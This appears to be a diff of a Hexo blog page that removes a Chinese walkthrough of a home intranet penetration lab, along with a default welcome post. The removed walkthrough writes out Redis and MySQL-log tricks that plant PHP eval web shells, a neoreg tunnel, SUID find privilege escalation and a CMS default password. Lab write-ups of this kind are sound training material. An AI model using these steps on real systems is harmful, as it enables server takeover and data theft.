@@ -114,107 +114,12 @@
   data-scroll-reveal
 >
   <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2023/03/15/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="article-date">
-  <time datetime="2023-03-15T12:47:36.072Z" itemprop="datePublished">2023-03-15</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <hr>
-<p>title：第一次内网靶场渗透<br>data：2023.03.16 20：00：00<br>tage：</p>
-<hr>
-<p>第一次接触到内网这一块，刚好最近新搭了博客。一共是两个靶机，一个外网一个内网，一个靶机有5个flag，第一个是windows的靶机，第二个是linux的。</p>
-<p>因为是在本地开的虚拟机，所以通过扫自己的c段找到网站。</p>
-<p>用dirsearch扫一下看看，可以发现几个有用的目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin      </span><br><span class="line"></span><br><span class="line">/flag.php           </span><br><span class="line"></span><br><span class="line">/.gitignore</span><br></pre></td></tr></table></figure>
-
-<p>&#x2F;.gitignore可以得到第一个flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303171837077.png" alt="image-20230317183700016"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303171843171.png" alt="image-20230317184344142"></p>
-<p>看见一个会员登入的地方和要会员才可以看见的flag，但是这里因为靶场的问题，验证码显示不出来，不能用弱口令登入，不过这是一个windows7的靶机，可以用端口的漏洞getshell。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181339911.png" alt="image-20230318133918036"></p>
-<p>nmap扫出来很多端口，这里用的是6379的redis未授权，这里没有扫出来</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先redis-cli -h url -p <span class="number">6379</span></span><br><span class="line"></span><br><span class="line">config set dir C:/phpstudy_pro/WWW<span class="comment">//设置路径，路径地址可以从之前dirsearch扫出来的一个flag.php爆出的错得到</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dbfilename hack.php<span class="comment">//设置文件名</span></span><br><span class="line"></span><br><span class="line">set x <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;1&#x27;]);?&gt;&quot;</span><span class="comment">//写入一句话</span></span><br><span class="line"></span><br><span class="line">save<span class="comment">//保存</span></span><br></pre></td></tr></table></figure>
-
-<p>就可以用蚁剑成功连接了</p>
-<p>可以看见第三个flag<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181342242.png" alt="image-20230318134223216"></p>
-<p>之前在网站上看见一个要会员登入才可以查看的flag<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181343740.png" alt="image-20230318134308712"></p>
-<p>一个flag需要getshell，一个需要弱口令登入，剩下两个就是数据库和提权了</p>
-<p>因为是dedecms搭的靶场，所以百度下很快可以找到数据库配置文件位置</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181343263.png" alt="image-20230318134358232"></p>
-<p>到之前扫到的phpmyadmin直接登入，可以找到第四个flag，这个flag忘记上传了<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181345943.png"></p>
-<p>第五个flag本来是要提权才可以得到，但是因为靶场的原因，getshell完就是提权，所以找到在哪里就可以直接看见，在user的桌面里<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181348267.png" alt="image-20230318134801246"></p>
-<p>第二个靶机需要代理才可以访问，这里用neoreg和proxifier做代理</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k key </span><br><span class="line"><span class="comment">//key就是连接的密码，自己设置</span></span><br><span class="line">python neoreg.py -k key -u url/tunnel.php</span><br><span class="line"><span class="comment">//tunnel.php是用neoreg.py生成的，用第一台的权限上传到第一台</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181358309.png" alt="image-20230318135842282"></p>
-<p>这个就是proxifier要设置的参数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181400122.png" alt="image-20230318140040093"></p>
-<p>进来就可以看见第六个flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181425440.png" alt="image-20230318142501397"></p>
-<p>然后就可以访问内网了，老样子先信息收集</p>
-<p>御剑扫出来两个有用的目录</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin</span><br><span class="line">/cms</span><br></pre></td></tr></table></figure>
-
-<p>进入&#x2F;cms，发现是taoCMS搭建的，百度发现后台地址是&#x2F;cms&#x2F;admin&#x2F;admin.php和弱口令admin&#x2F;tao，可以直接登入成功</p>
-<p>在网站设置发现第七个flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181428046.png" alt="image-20230318142805008"></p>
-<p>文件管理是我们要重点关注的地方，因为这个地方很可能有任意文件读取，在根目录可以读取到mysql数据库的账号和密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181430758.png" alt="image-20230318143027706"></p>
-<p>到之前御剑扫出的数据库地址进入数据库，可以找到第八个flag（同时这里还有一个任意文件下载，之前没有用任意文件读取，而是直接下载下了第九个flag）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181445871.png" alt="image-20230318144556831"></p>
-<p>接下来需要利用mysql数据库进行getshell，这里利用写入日志的方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%datadir%&#x27;</span>;</span><br><span class="line"><span class="comment">//查看数据库路径，在var/lib/mysql</span></span><br><span class="line">show variables like <span class="string">&#x27;%general%&#x27;</span></span><br><span class="line"><span class="comment">//查看是否开启日志</span></span><br><span class="line">set <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="comment">//开启日志</span></span><br><span class="line">set <span class="keyword">global</span> general_log_file =<span class="string">&#x27;/var/www/html/cms/config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//设置日志路径，路径在网站设置里</span></span><br><span class="line">select <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>;  </span><br><span class="line"><span class="comment">//写入一句话</span></span><br></pre></td></tr></table></figure>
-
-<p>然后用蚁剑连接</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;flag*&quot;</span></span><br><span class="line"><span class="comment">//查找flag</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181540910.png" alt="image-20230318154037851"></p>
-<p>可以看见一个flag和一个&#x2F;root&#x2F;flag.txt，第一个就是第九个flag</p>
-<p>看了这个博主写的文章，还有一些别的方法<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51478862/article/details/124580957?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167912160816800197016565%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167912160816800197016565&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-124580957-null-null.142%5Ev74%5Econtrol_1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=mysql%E6%95%B0%E6%8D%AE%E5%BA%93geshell&spm=1018.2226.3001.4187">mysql数据库getshell方法</a></p>
-<p>第九个flag也可以通过任意文件读取硬找出来，不过最好还是先通过数据库getshell，然后用find命令来找</p>
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181435794.png" alt="image-20230318143516760"></p>
-<p>root下的flag.txt要提权才可以查看，可以使用find命令来提权（suid提权）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="comment">//使用find命令查看拥有suid权限的文件</span></span><br><span class="line">touch <span class="number">1</span>.txt</span><br><span class="line"><span class="comment">//创建一个1.txt文件</span></span><br><span class="line">find <span class="number">1</span>.txt -exec whoami \;</span><br><span class="line"><span class="comment">//查看当前用户权限，发现是root说明提权成功</span></span><br><span class="line">find <span class="number">1</span>.txt -exec cat /root/flag.txt \;</span><br><span class="line"><span class="comment">//利用rot权限查看flag</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog@master/img/202303181552613.png" alt="image-20230318155213585"></p>
-<p>到这10个flag就找齐了，这次内网靶场对内网的知识有了更深的认识</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-   
-   
-  
-</article>
-
-    
-    <article
-  id="post-hello-world"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
     
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2023/03/14/hello-world/"
-    >Hello World</a> 
+  <a class="article-title" href="/2023/03/15/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"
+    >第一次内网靶场</a> 
 </h2>
  
 
@@ -222,31 +127,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/03/14/hello-world/" class="article-date">
-  <time datetime="2023-03-14T12:33:22.292Z" itemprop="datePublished">2023-03-14</time>
+      <a href="/2023/03/15/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="article-date">
+  <time datetime="2023-03-15T12:47:36.072Z" itemprop="datePublished">2023-03-15</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
